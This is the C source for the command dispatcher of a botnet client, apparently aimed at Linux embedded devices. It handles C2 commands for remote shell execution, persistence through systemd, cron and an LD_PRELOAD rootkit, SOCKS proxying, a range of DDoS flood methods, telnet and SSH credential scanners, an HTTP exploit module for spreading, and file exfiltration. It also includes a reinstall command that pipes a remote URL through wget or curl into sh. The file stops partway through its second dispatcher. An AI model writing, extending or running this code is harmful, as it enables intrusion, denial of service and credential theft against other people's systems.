/* ==========================================================================
 *  commands.c -- Command dispatcher and shell execution
 *  Pure C port of commands.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"
#ifndef NO_ATTACK
#include "attack.h"
#endif

/* ==========================================================================
 * SHELL EXECUTION (matches Go sidewinder -- blocking exec)
 * ========================================================================== */

dstr sidewinder(const char *cmd) {
    dstr output;
    FILE *fp;
    char buf[4096];
    int status;

    ensure_proto();

    /* popen() already invokes sh -c, so pass cmd directly — no double-wrap */
    ds_init(&output);
    fp = popen(cmd, "r");
    if (!fp) {
        ds_set(&output, "Error: popen failed");
        return output;
    }

    while (fgets(buf, sizeof(buf), fp)) {
        ds_cat(&output, buf);
    }

    status = pclose(fp);
    if (status != 0 && ds_empty(&output)) {
        char errbuf[64];
        snprintf(errbuf, sizeof(errbuf), "Error: exit code %d", WEXITSTATUS(status));
        ds_set(&output, errbuf);
    }
    return output;
}

/* ==========================================================================
 * DETACHED EXEC (matches Go oceanLotus -- fire-and-forget)
 * ========================================================================== */

void ocean_lotus(const char *cmd) {
    pid_t pid;
    int null_fd;

    ensure_proto();
    pid = fork();
    if (pid == 0) {
        /* Child */
        setsid();
        null_fd = open("/dev/null", O_RDWR);
        if (null_fd >= 0) {
            dup2(null_fd, STDIN_FILENO);
            dup2(null_fd, STDOUT_FILENO);
            dup2(null_fd, STDERR_FILENO);
            if (null_fd > 2) close(null_fd);
        }
        execl(ds_cstr(&g_shell_bin), ds_cstr(&g_shell_bin),
              ds_cstr(&g_shell_flag), cmd, (char *)NULL);
        _exit(1);
    }
    /* Parent: don't wait */
}

/* ==========================================================================
 * STREAMING EXEC (matches Go machete -- real-time output over C2)
 * ========================================================================== */

/* Thread context for pipe reader threads */
typedef struct {
    int      fd;
    conn_t  *conn;
    const char *fmt; /* pointer to ds_cstr of the format global */
} pipe_reader_ctx_t;

static void *pipe_reader_thread(void *arg) {
    pipe_reader_ctx_t *ctx = (pipe_reader_ctx_t *)arg;
    FILE *f;
    char line[4096];
    char sendbuf[4200];

    f = fdopen(ctx->fd, "r");
    if (!f) {
        close(ctx->fd);
        free(ctx);
        return NULL;
    }
    while (fgets(line, sizeof(line), f)) {
        snprintf(sendbuf, sizeof(sendbuf), ctx->fmt, line);
        vpn_writes(ctx->conn, sendbuf);
    }
    fclose(f); /* also closes ctx->fd */
    free(ctx);
    return NULL;
}

void machete(const char *cmd, conn_t *c) {
    int stdout_pipe[2], stderr_pipe[2];
    pid_t pid;
    pthread_t stdout_tid, stderr_tid;
    pipe_reader_ctx_t *out_ctx, *err_ctx;
    int status;

    ensure_proto();

    if (pipe(stdout_pipe) < 0) return;
    if (pipe(stderr_pipe) < 0) {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        return;
    }

    pid = fork();
    if (pid < 0) {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        close(stderr_pipe[0]); close(stderr_pipe[1]);
        return;
    }

    if (pid == 0) {
        /* Child */
        close(stdout_pipe[0]);
        close(stderr_pipe[0]);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stderr_pipe[1], STDERR_FILENO);
        close(stdout_pipe[1]);
        close(stderr_pipe[1]);
        execl(ds_cstr(&g_shell_bin), ds_cstr(&g_shell_bin),
              ds_cstr(&g_shell_flag), cmd, (char *)NULL);
        _exit(1);
    }

    /* Parent */
    close(stdout_pipe[1]);
    close(stderr_pipe[1]);

    out_ctx = (pipe_reader_ctx_t *)malloc(sizeof(pipe_reader_ctx_t));
    out_ctx->fd   = stdout_pipe[0];
    out_ctx->conn = c;
    out_ctx->fmt  = ds_cstr(&g_proto_stdout_fmt);
    pthread_create(&stdout_tid, NULL, pipe_reader_thread, out_ctx);

    err_ctx = (pipe_reader_ctx_t *)malloc(sizeof(pipe_reader_ctx_t));
    err_ctx->fd   = stderr_pipe[0];
    err_ctx->conn = c;
    err_ctx->fmt  = ds_cstr(&g_proto_stderr_fmt);
    pthread_create(&stderr_tid, NULL, pipe_reader_thread, err_ctx);

    status = 0;
    waitpid(pid, &status, 0);
    pthread_join(stdout_tid, NULL);
    pthread_join(stderr_tid, NULL);

    if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        char buf[256];
        char codebuf[32];
        snprintf(codebuf, sizeof(codebuf), "exit code %d", WEXITSTATUS(status));
        snprintf(buf, sizeof(buf), ds_cstr(&g_proto_exit_err_fmt), codebuf);
        vpn_writes(c, buf);
    } else {
        vpn_writes(c, ds_cstr(&g_proto_exit_ok));
    }
}

/* ==========================================================================
 * MACHETE THREAD WRAPPER (for detached streaming)
 * ========================================================================== */

typedef struct {
    char   *cmd;
    conn_t *conn;
} machete_ctx_t;

static void *machete_thread(void *arg) {
    machete_ctx_t *ctx = (machete_ctx_t *)arg;
    machete(ctx->cmd, ctx->conn);
    free(ctx->cmd);
    free(ctx);
    return NULL;
}

/* ==========================================================================
 * DRAGONFLY THREAD WRAPPER (for detached persist)
 * ========================================================================== */

static void *dragonfly_thread(void *arg) {
    (void)arg;
    dragonfly();
    return NULL;
}

/* ==========================================================================
 * HELPER: tokenize a command string into a strarr
 * ========================================================================== */

static void tokenize(const char *command, strarr *fields) {
    const char *p = command;
    sa_init(fields);
    while (*p) {
        const char *start;
        dstr tok;
        /* skip whitespace */
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        start = p;
        while (*p && *p != ' ' && *p != '\t') p++;
        ds_init(&tok);
        ds_setn(&tok, start, (size_t)(p - start));
        sa_pushds(fields, &tok);
        ds_free(&tok);
    }
}

/* Helper: find start of args after first token */
static const char *find_args(const char *command, const char *first_arg) {
    const char *p = strstr(command, first_arg);
    return p ? p : "";
}

/* Helper: check if string is all digits */
static int is_port_str(const char *s) {
    if (!s || !*s) return 0;
    while (*s) {
        if (*s < '0' || *s > '9') return 0;
        s++;
    }
    return 1;
}

/* ==========================================================================
 * COMMAND DISPATCHER (matches Go blackEnergy)
 * ========================================================================== */

int black_energy(conn_t *c, const char *command) {
    strarr fields;
    const char *cmd_str;
    int result = -1;

    ensure_proto();
    ensure_network();

    tokenize(command, &fields);
    if (sa_count(&fields) == 0) { sa_free(&fields); return -1; }

    cmd_str = sa_get(&fields, 0);

    /* !shell / !exec -- blocking shell command */
    if (strcmp(cmd_str, "!shell") == 0 || strcmp(cmd_str, "!exec") == 0) {
        const char *args;
        dstr output, encoded, msg;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        output = sidewinder(args);
        encoded = base64_encode((const uint8_t *)ds_cstr(&output), ds_len(&output));
        ds_free(&output);

        ds_init(&msg);
        {
            size_t needed = ds_len(&encoded) + ds_len(&g_proto_out_fmt) + 16;
            char *buf = (char *)malloc(needed);
            snprintf(buf, needed, ds_cstr(&g_proto_out_fmt), ds_cstr(&encoded));
            ds_set(&msg, buf);
            free(buf);
        }
        ds_free(&encoded);
        vpn_writes(c, ds_cstr(&msg));
        ds_free(&msg);
        result = 0;
        goto done;
    }

    /* !stream -- streaming output */
    if (strcmp(cmd_str, "!stream") == 0) {
        const char *args;
        machete_ctx_t *ctx;
        pthread_t tid;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        ctx = (machete_ctx_t *)malloc(sizeof(machete_ctx_t));
        if (!ctx) { sa_free(&fields); return -1; }
        ctx->cmd  = (char *)malloc(strlen(args) + 1);
        if (!ctx->cmd) { free(ctx); sa_free(&fields); return -1; }
        memcpy(ctx->cmd, args, strlen(args) + 1);
        ctx->conn = c;
        pthread_create(&tid, NULL, machete_thread, ctx);
        pthread_detach(tid);
        vpn_writes(c, ds_cstr(&g_msg_stream_start));
        result = 0;
        goto done;
    }

    /* !detach / !bg -- background exec */
    if (strcmp(cmd_str, "!detach") == 0 || strcmp(cmd_str, "!bg") == 0) {
        const char *args;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        ocean_lotus(args);
        vpn_writes(c, ds_cstr(&g_msg_bg_start));
        result = 0;
        goto done;
    }

    /* !persist -- comprehensive persistence */
    if (strcmp(cmd_str, "!persist") == 0) {
        /* Check for subcommands */
        const char *sub = (sa_count(&fields) >= 2) ? sa_get(&fields, 1) : "";
        if (strcmp(sub, "rootkit") == 0) {
            const char *b64 = (sa_count(&fields) >= 3) ? find_args(command, sa_get(&fields, 2)) : "";
            rootkit_install(b64);
            vpn_writes(c, "[rootkit] LD_PRELOAD rootkit installed\n");
            result = 0;
            goto done;
        } else if (strcmp(sub, "unrootkit") == 0) {
            rootkit_remove();
            vpn_writes(c, "[rootkit] Rootkit removed\n");
            result = 0;
            goto done;
        }
        /* Default: standard persistence (systemd/cron) */
        {
            pthread_t tid;
            pthread_create(&tid, NULL, dragonfly_thread, NULL);
            pthread_detach(tid);
            vpn_writes(c, ds_cstr(&g_msg_persist_start));
        }
        result = 0;
        goto done;
    }

    /* !kill -- self-destruct */
    if (strcmp(cmd_str, "!kill") == 0) {
        vpn_writes(c, ds_cstr(&g_msg_kill_ack));
        sa_free(&fields);
        nuke_and_exit();
        return 0; /* unreachable */
    }

    /* !exit -- lightweight process exit (no nuke, persistence stays intact).
     * Used by CNC to kick a stale session so a new instance can take over. */
    if (strcmp(cmd_str, "!exit") == 0) {
        debug_log("!exit received from CNC, shutting down (PID %d)", (int)getpid());
        sa_free(&fields);
        _exit(0);
        return 0; /* unreachable */
    }

    /* !info -- system information */
    if (strcmp(cmd_str, "!info") == 0) {
        char hostname[256];
        dstr arch, id;
        char info[1024];
        char sendbuf[1200];

        memset(hostname, 0, sizeof(hostname));
        gethostname(hostname, sizeof(hostname) - 1);
        charming_kitten(&arch);
        mustang_panda(&id);

        snprintf(info, sizeof(info),
                 "Hostname: %s\nArch: %s\nBotID: %s\nOS: Linux\n",
                 hostname, ds_cstr(&arch), ds_cstr(&id));
        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&g_proto_info_fmt), info);
        vpn_writes(c, sendbuf);

        ds_free(&arch);
        ds_free(&id);
        result = 0;
        goto done;
    }

    /* !socks -- SOCKS5 proxy (direct or relay backconnect) */
    if (strcmp(cmd_str, "!socks") == 0) {
        if (sa_count(&fields) >= 2) {
            const char *arg = sa_get(&fields, 1);
            if (strchr(arg, ':') != NULL) {
                /* Relay mode: arg is host:port */
                dstr rhost, rport;
                ds_init(&rhost);
                ds_init(&rport);
                if (parse_address(arg, &rhost, &rport)) {
                    int err = relay_backconnect(ds_cstr(&rhost), ds_cstr(&rport), c);
                    if (err < 0) {
                        char buf[256];
                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "relay connect failed");
                        vpn_writes(c, buf);
                    } else {
                        char buf[256];
                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), arg);
                        vpn_writes(c, buf);
                    }
                } else {
                    char buf[256];
                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "invalid relay address");
                    vpn_writes(c, buf);
                }
                ds_free(&rhost);
                ds_free(&rport);
            } else {
                /* Direct mode: arg is port number */
                int err = turmoil(arg, c);
                if (err != 0) {
                    char buf[256];
                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
                    vpn_writes(c, buf);
                } else {
                    char buf[256];
                    char addr[64];
                    snprintf(addr, sizeof(addr), "0.0.0.0:%s", arg);
                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), addr);
                    vpn_writes(c, buf);
                }
            }
            result = 0;
            goto done;
        } else {
            /* Default port 1080 */
            int err = turmoil("1080", c);
            if (err != 0) {
                char buf[256];
                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
                vpn_writes(c, buf);
            } else {
                char buf[256];
                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), "0.0.0.0:1080");
                vpn_writes(c, buf);
            }
            result = 0;
            goto done;
        }
    }

#ifndef NO_ATTACK
    /* !attack -- launch flood attack
     * Format: !attack <method> <target_ip> <port> <duration> [key=val ...]
     * Example: !attack syn 1.2.3.4 80 30 size=512
     */
    if (strcmp(cmd_str, "!attack") == 0) {
        static const struct { const char *name; uint8_t id; } methods[] = {
            {"udp",        ATK_VEC_UDP},
            {"vse",        ATK_VEC_VSE},
            {"dns",        ATK_VEC_DNS},
            {"syn",        ATK_VEC_SYN},
            {"ack",        ATK_VEC_ACK},
            {"stomp",      ATK_VEC_STOMP},
            {"greip",      ATK_VEC_GREIP},
            {"greeth",     ATK_VEC_GREETH},
            {"udpplain",   ATK_VEC_UDP_PLAIN},
            {"std",        ATK_VEC_STD},
            {"xmas",       ATK_VEC_XMAS},
            {"usyn",       ATK_VEC_USYN},
            {"tcpall",     ATK_VEC_TCPALL},
            {"tcpfrag",    ATK_VEC_TCPFRAG},
            {"ovh",        ATK_VEC_OVH},
            {"asyn",       ATK_VEC_ASYN},
            {NULL, 0}
        };
        static const struct { const char *key; uint8_t opt_id; } opt_map[] = {
            {"size",    ATK_OPT_PAYLOAD_SIZE}, {"rand",   ATK_OPT_PAYLOAD_RAND},
            {"tos",     ATK_OPT_IP_TOS},      {"ident",  ATK_OPT_IP_IDENT},
            {"ttl",     ATK_OPT_IP_TTL},       {"df",     ATK_OPT_IP_DF},
            {"sport",   ATK_OPT_SPORT},        {"dport",  ATK_OPT_DPORT},
            {"urg",     ATK_OPT_URG},          {"ack",    ATK_OPT_ACK},
            {"psh",     ATK_OPT_PSH},          {"rst",    ATK_OPT_RST},
            {"syn",     ATK_OPT_SYN},          {"fin",    ATK_OPT_FIN},
            {"seqrnd",  ATK_OPT_SEQRND},      {"ackrnd", ATK_OPT_ACKRND},
            {"gcip",    ATK_OPT_GRE_CONSTIP},  {"source", ATK_OPT_SOURCE},
            {"domain",  ATK_OPT_DOMAIN},
            {NULL, 0}
        };
        uint8_t method_id = 0xff;
        uint32_t target_ip, duration;
        uint16_t port;
        char sendbuf[256];
        int i;

        if (sa_count(&fields) < 5) {
            vpn_writes(c, "Usage: !attack <method> <ip> <port> <duration> [opts...]\n");
            result = -1;
            goto done;
        }

        for (i = 0; methods[i].name; i++) {
            if (strcmp(sa_get(&fields, 1), methods[i].name) == 0) {
                method_id = methods[i].id;
                break;
            }
        }
        if (method_id == 0xff) {
            snprintf(sendbuf, sizeof(sendbuf), "Unknown method: %s\n", sa_get(&fields, 1));
            vpn_writes(c, sendbuf);
            result = -1;
            goto done;
        }

        target_ip = inet_addr(sa_get(&fields, 2));
        port = (uint16_t)atoi(sa_get(&fields, 3));
        duration = (uint32_t)atoi(sa_get(&fields, 4));

        if (target_ip == INADDR_NONE || duration == 0) {
            vpn_writes(c, "Invalid target IP or duration\n");
            result = -1;
            goto done;
        }

        /* Build binary buffer for attack_parse:
         * [uint32 duration BE][uint8 vector][uint8 num_targets]
         * [uint32 ip][uint8 netmask]
         * [uint8 num_opts]([uint8 opt_key][uint8 val_len][val bytes])...
         */
        {
            char buf[2048];
            int pos = 0;
            int num_opts = 0;
            int opts_start;
            int fi;

            *(uint32_t *)(buf + pos) = htonl(duration);
            pos += 4;
            buf[pos++] = (char)method_id;
            buf[pos++] = 1; /* num_targets */
            *(uint32_t *)(buf + pos) = target_ip;
            pos += 4;
            buf[pos++] = 32; /* netmask /32 */

            opts_start = pos;
            pos++; /* placeholder for num_opts */

            if (port != 0) {
                char portstr[8];
                int plen;
                snprintf(portstr, sizeof(portstr), "%d", port);
                plen = (int)strlen(portstr);
                buf[pos++] = ATK_OPT_DPORT;
                buf[pos++] = (char)plen;
                memcpy(buf + pos, portstr, plen);
                pos += plen;
                num_opts++;
            }

            for (fi = 5; fi < (int)sa_count(&fields); fi++) {
                const char *arg = sa_get(&fields, fi);
                const char *eq = strchr(arg, '=');
                if (!eq) continue;
                {
                    char key[32];
                    const char *val;
                    int vlen, oi;
                    int keylen = (int)(eq - arg);
                    if (keylen >= (int)sizeof(key)) continue;
                    memcpy(key, arg, keylen);
                    key[keylen] = '\0';
                    val = eq + 1;
                    vlen = (int)strlen(val);
                    if (vlen > 255 || vlen == 0) continue;

                    for (oi = 0; opt_map[oi].key; oi++) {
                        if (strcmp(key, opt_map[oi].key) == 0) {
                            buf[pos++] = opt_map[oi].opt_id;
                            buf[pos++] = (char)vlen;
                            memcpy(buf + pos, val, vlen);
                            pos += vlen;
                            num_opts++;
                            break;
                        }
                    }
                }
            }

            buf[opts_start] = (char)num_opts;

            attack_parse(buf, pos);

            snprintf(sendbuf, sizeof(sendbuf),
                     "[attack] %s -> %s:%d for %ds started\n",
                     sa_get(&fields, 1), sa_get(&fields, 2), port, duration);
            vpn_writes(c, sendbuf);
        }
        result = 0;
        goto done;
    }

    /* !stopattack -- kill all running floods */
    if (strcmp(cmd_str, "!stopattack") == 0) {
        attack_kill_all();
        vpn_writes(c, "[attack] all floods stopped\n");
        result = 0;
        goto done;
    }
#endif /* NO_ATTACK */

    /* !reinstall <url> -- force-replace: remove lock + binary, fire loader, exit.
     * The loader sees no running instance and downloads a fresh binary. */
    if (strcmp(cmd_str, "!reinstall") == 0) {
        const char *url;
        char cmd_buf[1024];
        if (sa_count(&fields) < 2) {
            vpn_writes(c, "[reinstall] missing URL\n");
            result = -1;
            goto done;
        }
        url = sa_get(&fields, 1);

        vpn_writes(c, "[reinstall] replacing — killing self, fetching fresh binary\n");

        /* Remove cached binary so the loader re-downloads */
        {
            dstr bin_path;
            ensure_persist();
            ds_init(&bin_path);
            ds_catds(&bin_path, &g_store_dir);
            ds_cat(&bin_path, "/");
            ds_catds(&bin_path, &g_bin_label);
            unlink(ds_cstr(&bin_path));
            ds_free(&bin_path);
        }

        /* Fire loader in background — it will start a new instance */
        snprintf(cmd_buf, sizeof(cmd_buf),
                 "(wget -qO- '%s' | sh || curl -sL '%s' | sh) &",
                 url, url);
        ocean_lotus(cmd_buf);

        /* Give the background fetch a moment to fork, then die */
        usleep(200000);
        _exit(0);
    }

    /* !stopsocks -- stop proxy */
    if (strcmp(cmd_str, "!stopsocks") == 0) {
        emotet();
        vpn_writes(c, ds_cstr(&g_msg_socks_stop));
        result = 0;
        goto done;
    }

#ifndef NO_SELFREP
    /* !scan <host:port> -- start telnet scanner reporting to scan server */
    if (strcmp(cmd_str, "!scan") == 0) {
        if (g_scanner_running) {
            vpn_writes(c, "[scanner] Already running\n");
        } else if (sa_count(&fields) < 2) {
            vpn_writes(c, "Usage: !scan <host:port>\n");
            result = -1;
            goto done;
        } else {
            const char *addr = sa_get(&fields, 1);
            char buf[256];
            scanner_init(addr);
            snprintf(buf, sizeof(buf), "[scanner] Starting — reporting to %s\n", addr);
            vpn_writes(c, buf);
        }
        result = 0;
        goto done;
    }

    /* !stopscan -- stop telnet scanner */
    if (strcmp(cmd_str, "!stopscan") == 0) {
        if (g_scanner_running) {
            scanner_kill();
            vpn_writes(c, "[scanner] Scanner stopped\n");
        } else {
            vpn_writes(c, "[scanner] Scanner not running\n");
        }
        result = 0;
        goto done;
    }



    /* !ssh <base64 payload> -- start SSH credential scanner */
    if (strcmp(cmd_str, "!ssh") == 0) {
        const char *args_ssh;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args_ssh = find_args(command, sa_get(&fields, 1));
        if (ssh_scanner_pid > 0) {
            vpn_writes(c, "[ssh] Already running\n");
        } else {
            ssh_scanner_init(args_ssh, c);
            vpn_writes(c, "[ssh] Scanner started\n");
        }
        result = 0;
        goto done;
    }

    /* !stopssh -- stop SSH scanner */
    if (strcmp(cmd_str, "!stopssh") == 0) {
        if (ssh_scanner_pid > 0) {
            ssh_scanner_kill();
            vpn_writes(c, "[ssh] Scanner stopped\n");
        } else {
            vpn_writes(c, "[ssh] Scanner not running\n");
        }
        result = 0;
        goto done;
    }

    /* !http <base64 payload> — HTTP exploit module */
    if (strcmp(cmd_str, "!http") == 0) {
        const char *args_http;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args_http = find_args(command, sa_get(&fields, 1));
        if (http_exploit_pid > 0) {
            vpn_writes(c, "[http] Already running\n");
        } else {
            http_exploit_init(args_http);
            vpn_writes(c, "[http] Exploit module started\n");
        }
        result = 0;
        goto done;
    }

    if (strcmp(cmd_str, "!stophttp") == 0) {
        if (http_exploit_pid > 0) { http_exploit_kill(); vpn_writes(c, "[http] Stopped\n"); }
        else vpn_writes(c, "[http] Not running\n");
        result = 0; goto done;
    }


#endif /* NO_SELFREP */

    /* !download <path> -- read file and send base64-encoded with markers */
    if (strcmp(cmd_str, "!download") == 0) {
        const char *path;
        FILE *f;
        long fsize;
        char *raw;
        dstr b64, msg;
        const char *basename_ptr;

        if (sa_count(&fields) < 2) {
            vpn_writes(c, "[download] missing path\n");
            result = -1;
            goto done;
        }
        path = sa_get(&fields, 1);

        f = fopen(path, "rb");
        if (!f) {
            char ebuf[512];
            snprintf(ebuf, sizeof(ebuf), "[download] cannot open: %s\n", path);
            vpn_writes(c, ebuf);
            result = -1;
            goto done;
        }
        fseek(f, 0, SEEK_END);
        fsize = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (fsize < 0 || fsize > 10 * 1024 * 1024) {
            fclose(f);
            vpn_writes(c, "[download] file too large (>10MB)\n");
            result = -1;
            goto done;
        }
        raw = (char *)malloc((size_t)fsize + 1);
        if (!raw) { fclose(f); result = -1; goto done; }
        if ((long)fread(raw, 1, (size_t)fsize, f) != fsize) {
            free(raw);
            fclose(f);
            vpn_writes(c, "[download] read error\n");
            result = -1;
            goto done;
        }
        fclose(f);

        b64 = base64_encode((const uint8_t *)raw, (size_t)fsize);
        free(raw);

        /* Extract basename from path */
        basename_ptr = strrchr(path, '/');
        if (basename_ptr) basename_ptr++;
        else basename_ptr = path;

        /* Send: __FILE_START__<basename>\n<base64>\n__FILE_END__\n */
        ds_init(&msg);
        ds_cat(&msg, "__FILE_START__");
        ds_cat(&msg, basename_ptr);
        ds_cat(&msg, "\n");
        ds_catds(&msg, &b64);
        ds_cat(&msg, "\n__FILE_END__\n");
        ds_free(&b64);

        vpn_writes(c, ds_cstr(&msg));
        ds_free(&msg);
        result = 0;
        goto done;
    }

    /* !upload <path> <base64data> -- decode base64 and write to file */
    if (strcmp(cmd_str, "!upload") == 0) {
        const char *path;
        const char *b64data;
        dbuf decoded;
        FILE *f;

        if (sa_count(&fields) < 3) {
            vpn_writes(c, "[upload] usage: !upload <path> <base64data>\n");
            result = -1;
            goto done;
        }
        path = sa_get(&fields, 1);
        b64data = sa_get(&fields, 2);
        decoded = base64_decode(b64data);
        if (db_len(&decoded) == 0 && strlen(b64data) > 0) {
            vpn_writes(c, "[upload] base64 decode failed\n");
            db_free(&decoded);
            result = -1;
            goto done;
        }
        f = fopen(path, "wb");
        if (!f) {
            char ebuf[512];
            snprintf(ebuf, sizeof(ebuf), "[upload] cannot write: %s\n", path);
            vpn_writes(c, ebuf);
            db_free(&decoded);
            result = -1;
            goto done;
        }
        fwrite(db_ptr(&decoded), 1, db_len(&decoded), f);
        fclose(f);
        {
            char obuf[512];
            snprintf(obuf, sizeof(obuf), "[upload] wrote %lu bytes to %s\n",
                     (unsigned long)db_len(&decoded), path);
            vpn_writes(c, obuf);
        }
        db_free(&decoded);
        result = 0;
        goto done;
    }

    /* !socksauth -- set SOCKS credentials */
    if (strcmp(cmd_str, "!socksauth") == 0) {
        char buf[256];
        if (sa_count(&fields) < 3) { sa_free(&fields); return -1; }
        pthread_mutex_lock(&g_socks_creds_mtx);
        ds_set(&g_proxy_user, sa_get(&fields, 1));
        ds_set(&g_proxy_pass, sa_get(&fields, 2));
        pthread_mutex_unlock(&g_socks_creds_mtx);
        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_auth_fmt), sa_get(&fields, 1), sa_get(&fields, 2));
        vpn_writes(c, buf);
        result = 0;
        goto done;
    }

    /* unknown command */
    result = -1;

done:
    sa_free(&fields);
    return result;
}

/* ==========================================================================
 * BINARY COMMAND DISPATCHER (cmd_id + raw args)
 * Maps byte IDs to the same logic as black_energy but skips string matching.
 * ========================================================================== */

int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
    ensure_proto();
    ensure_network();

    switch (cmd_id) {

    case CMD_SHELL: /* args = command string */
    {
        dstr output, encoded, msg;
        if (!args || !args[0]) return -1;
        output = sidewinder(args);
        encoded = base64_encode((const uint8_t *)ds_cstr(&output), ds_len(&output));
        ds_free(&output);
        ds_init(&msg);
        {
            size_t needed = ds_len(&encoded) + ds_len(&g_proto_out_fmt) + 16;
            char *buf = (char *)malloc(needed);
            snprintf(buf, needed, ds_cstr(&g_proto_out_fmt), ds_cstr(&encoded));
            ds_set(&msg, buf);
            free(buf);
        }
        ds_free(&encoded);
        vpn_writes(c, ds_cstr(&msg));
        ds_free(&msg);
        return 0;
    }

    case CMD_STREAM: /* args = command string */
    {
        machete_ctx_t *ctx;
        pthread_t tid;
        if (!args || !args[0]) return -1;
        ctx = (machete_ctx_t *)malloc(sizeof(machete_ctx_t));
        if (!ctx) return -1;
        ctx->cmd  = (char *)malloc(strlen(args) + 1);
        if (!ctx->cmd) { free(ctx); return -1; }
        memcpy(ctx->cmd, args, strlen(args) + 1);
        ctx->conn = c;
        pthread_create(&tid, NULL, machete_thread, ctx);
        pthread_detach(tid);
        vpn_writes(c, ds_cstr(&g_msg_stream_start));
        return 0;
    }

    case CMD_DETACH: /* args = command string */
        if (!args || !args[0]) return -1;
        ocean_lotus(args);
        vpn_writes(c, ds_cstr(&g_msg_bg_start));
        return 0;

    case CMD_INFO:
    {
        char hostname[256];
        dstr arch, id;
        char info[1024], sendbuf[1200];
        memset(hostname, 0, sizeof(hostname));
        gethostname(hostname, sizeof(hostname) - 1);
        charming_kitten(&arch);
        mustang_panda(&id);
        snprintf(info, sizeof(info),
                 "Hostname: %s\nArch: %s\nBotID: %s\nOS: Linux\n",
                 hostname, ds_cstr(&arch), ds_cstr(&id));
        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&g_proto_info_fmt), info);
        vpn_writes(c, sendbuf);
        ds_free(&arch);
        ds_free(&id);
        return 0;
    }

    case CMD_SOCKS: /* args = "" (default) or "port" or "host:port" */
    {
        if (args && args[0]) {
            if (strchr(args, ':') != NULL) {
                dstr rh, rp;
                ds_init(&rh); ds_init(&rp);
                if (parse_address(args, &rh, &rp)) {
                    int err = relay_backconnect(ds_cstr(&rh), ds_cstr(&rp), c);
                    char buf[256];
                    if (err < 0)
                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "relay connect failed");
                    else
                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), args);
                    vpn_writes(c, buf);
                }
                ds_free(&rh); ds_free(&rp);
            } else {
                int err = turmoil(args, c);
                char buf[256], addr[64];
                if (err != 0)
                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
                else {
                    snprintf(addr, sizeof(addr), "0.0.0.0:%s", args);
                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), addr);
                }
                vpn_writes(c, buf);
            }
        } else {
            int err = turmoil("1080", c);
            char buf[256];
            if (err != 0)
                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
            else
                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), "0.0.0.0:1080");
            vpn_writes(c, buf);
        }
        return 0;
    }

    case CMD_STOPSOCKS:
        emotet();
        vpn_writes(c, ds_cstr(&g_msg_socks_stop));
        return 0;

    case CMD_SOCKSAUTH: /* args = "user pass" */
    {
        char buf[256];
        const char *sp = strchr(args, ' ');
        if (!sp) return -1;
        {
            char user[128], pass[128];
            size_t ulen = (size_t)(sp - args);
            if (ulen >= sizeof(user)) ulen = sizeof(user) - 1;
            memcpy(user, args, ulen); user[ulen] = '\0';
            strncpy(pass, sp + 1, sizeof(pass) - 1); pass[sizeof(pass) - 1] = '\0';
            pthread_mutex_lock(&g_socks_creds_mtx);
            ds_set(&g_proxy_user, user);
            ds_set(&g_proxy_pass, pass);
            pthread_mutex_unlock(&g_socks_creds_mtx);
            snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_auth_fmt), user, pass);
        }
        vpn_writes(c, buf);
        return 0;
    }

#ifndef NO_SELFREP
    case CMD_SCAN: /* args = "host:port" */
        if (g_scanner_running) {
            vpn_writes(c, "[scanner] Already running\n");
        } else if (!args || !args[0]) {
            vpn_writes(c, "Usage: !scan <host:port>\n");
        } else {
            char buf[256];
            scanner_init(args);
            snprintf(buf, sizeof(buf), "[scanner] Starting — reporting to %s\n", args);
            vpn_writes(c, buf);
        }
        return 0;

    case CMD_STOPSCAN:
        if (g_scanner_running) {
            scanner_kill();
            vpn_writes(c, "[scanner] Scanner stopped\n");
        } else {
            vpn_writes(c, "[scanner] Scanner not running\n");
        }
        return 0;


    case CMD_SSH:
        if (ssh_scanner_pid > 0) {
            vpn_writes(c, "[ssh] Already running\n");
        } else {
            ssh_scanner_init(args, c);
            vpn_writes(c, "[ssh] Scanner started\n");
        }
        return 0;

    case CMD_STOPSSH:
        if (ssh_scanner_pid > 0) {
            ssh_scanner_kill();
            vpn_writes(c, "[ssh] Scanner stopped\n");
        } else {
            vpn_writes(c, "[ssh] Scanner not running\n");
        }
        return 0;

    case CMD_HTTP:
        if (http_exploit_pid > 0) {
            vpn_writes(c, "[http] Already running\n");
        } else {
            http_exploit_init(args);
            vpn_writes(c, "[http] Exploit module started\n");
        }
        return 0;

    case CMD_STOPHTTP:
        if (http_exploit_pid > 0) { http_exploit_kill(); vpn_writes(c, "[http] Stopped\n"); }
        else vpn_writes(c, "[http] Not running\n");
        return 0;


